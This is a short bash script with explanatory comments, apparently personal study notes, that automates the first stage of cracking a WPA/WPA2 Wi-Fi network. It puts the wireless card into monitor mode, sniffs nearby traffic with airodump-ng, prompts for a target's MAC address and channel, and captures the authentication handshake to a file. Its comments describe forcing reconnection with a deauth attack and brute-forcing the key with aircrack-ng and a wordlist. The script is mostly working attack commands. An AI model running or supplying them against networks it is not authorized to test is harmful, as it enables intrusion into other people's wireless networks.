#!/bin/bash

#######################
#        WPA          #
#######################

# Should try WPS method first if it is enabled
# WPA each packet is encrypted with a unique, temporary id
# Therefore, collecting packets is useless
# Except handshake packets when device first connects to access point
# Four packets are transferred between the two devices to authenticate
# To crack WPA/WPA2 AP with WPS disabled we need 2 things:
# 1. capture the handshake
# 2. a wordlist
# ***can use deauth attack to disconnect device so it has to reconnect and handshake can be captured

iwconfig wlan1 down                           		# Bring the network interface down 
iwconfig wlan1 mode monitor                             # Put the wifi card into monitor mode                         
airodump-ng wlan1                                       # Sniff all traffic in the area                               
echo "What is the target host's MAC address?"           # Enter the target host's MAC address
read host_mac

echo "What is the target host's channel?"               # Enter the target host's MAC address
read ch

 							# Sniff traffic just on the target network

airodump-ng --channel $ch --bssid $host_mac --write test-handshake wlan1
		
			# Can do deauth attack to disconnect/reconnect client to capture handshake
			# wordlist -- aircrack-ng tries each word on list against handshake until it finds the WPA key 

 
